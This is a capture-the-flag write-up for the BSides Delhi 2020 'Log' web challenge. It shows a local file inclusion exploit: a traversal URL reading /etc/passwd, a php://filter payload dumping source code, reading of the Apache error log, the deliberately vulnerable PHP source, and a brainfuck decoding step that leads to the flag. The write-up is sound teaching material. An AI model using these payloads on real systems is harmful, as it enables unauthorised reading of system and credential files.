# Bsides Delhi CTF 2020: Web - Log (Variable Scoring)

<p align="center">
<img src="https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/BsidesDelhi2020/Log-description.PNG">
</p>

From the description of the challenge, we can get 2 key elements; the first one is that `GET` method will be used at some point and the second is that this challenge has something to do with `Logs`.


## Recon and Analysis

Going into the website, we can see lots of files to click on and they basically all end up giving the same output..

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/BsidesDelhi2020/Log-intro.PNG)
![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/BsidesDelhi2020/Log-intro2.PNG)

If you keep going down the list, you will eventually find a pattern in the url `http://3.7.251.179/click-here_1.php`. The name of the `php` script in the directory increments by 1 all the way to 99, by then you should try numbers like `click-here_100.php` and `click-here_0.php`... At last you will find the correct file _hopefully_ that is `click-here_00.php`. 

After that, you will be greeted with a new response:

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/BsidesDelhi2020/Log-Correct_file.PNG)

`You got the right 'file' :)` is considered a hint from the author of the challenge along with the description of using `GET`. The intended path is to use `file` as a parameter in a `GET` request. 

Trying out the url `http://3.7.251.179/click-here_00.php?file=../../../../../../../../etc/passwd` will yeld us LFI (Local File Inclusion) and we can read the content of `/etc/passwd`, where the challenge begins.

## Solution and Flag

Searching around the internet for LFI vulnerabilities and payloads. I came across a couple of interesting stuff from [PayloadAllTheThings](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal).

Trying to read the content of the `click-here_00.php` itself using `php://filter/convert.base64-encode/resource=click-here_00.php`, we will have the base64 encoded script. We can easily decode it and view the php script:

```html
<html>
    <title>Something here!</title>
    <body>
            <?php
          		if(!isset($_GET['file']))
          		{
          			echo "You got the right 'file' :)";
          		} elseif($file=$_GET['file'])
          		{
          			echo file_get_contents($file);
          			die();
          		}
            #There is some error in logs try to access it.
            ?>
    </body>
</html>
```

Checking the location of the HTTP error logs, I found [this](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) blog:
>Debian / Ubuntu Linux Apache error log file location – /var/log/apache2/error.log

So, I used the same LFI payload but changed the resource to `/var/log/apache2/error.log` and got this output:

```html
<html>
    <title>Something here!</title>
    <body>
            LS0tLS0tLS0tLV08LTwtLS08LS0tLS0tLTwtLS0tLS0tLS0tPj4+PitbPDwtLS0tLS0tLS0tLS0tLS0tLSw8PC0tLD4+LDw8LS0tLS0tLD4+LDw8KysrKysrKysrKyssPj4sPDwtLS0tLS0sPj4sPDwtLS0tLS0tLS0tLS0sKysrKywrKywrKysrKysrKywtLS0tLS0tLS0tLS0tLS0sKysrKysrKysrKysrLC0sLS0tLS0sKysrKysrKyw+LS0tLS0tLS0tLS0tLS0tLDwtLS0tLS0tLCsrKysrKysrKywsKyw+PissPDwtLS0tLS0tLS0tLS0tLS0tLC0tLS0sKysrKyxBSDAwNTU4OiBhcGFjaGUyOiBDb3VsZCBub3QgcmVsaWFibHkgZGV0ZXJtaW5lIHRoZSBzZXJ2ZXIncyBmdWxseSBxdWFsaWZpZWQgZG9tYWluIG5hbWUsIHVzaW5nIDE3Mi4xNy4wLjIuIFNldCB0aGUgJ1NlcnZlck5hbWUnIGRpcmVjdGl2ZSBnbG9iYWxseSB0byBzdXBwcmVzcyB0aGlzIG1lc3NhZ2UKW1NhdCBPY3QgMTAgMTg6MjU6MjUuNTcwNDg0I
            ....
    </body>
```

Decoding that file from base64, I found something similar to `brainfuck`, which is an [esoteric programming language](https://en.wikipedia.org/wiki/Esoteric_programming_language).

```brainfuck
----------]<-<---<-------<---------->>>>+[<<-----------------,<<--,>>,<<------,>>,<<+++++++++++,>>,<<------,>>,<<------------,++++,++,++++++++,---------------,++++++++++++,-,-----,+++++++,>---------------,<-------,+++++++++,,+,>>+,<<----------------,----,++++,
```

While reading about `brainfuck`, I found that it can be interpreted and output something only if it contains a period `"."` and it will request an input when it contains a coma `","`. The string that I had only contained comas, and I found that there were closed square brackets that were not opened and vise-versa.

>Maybe I need to reverse it before interpreting it. Hmmmmmm!!

Afterward, I got stuck on the "no periods" part.. Then it hit me, maybe there is a "Reversed-brainfuck" esoteric programming language, and a simple google search revealed a decoder and I got this output:

```
/f/l/a/g/somethingUneed.txt
```

Using the LFI payload again, but this time the resource is going to be that new directory, we will get the flag...

`BSDCTF{L0cal_f1L3_InClu$10N_1$_v3RY_P015On0u$}`
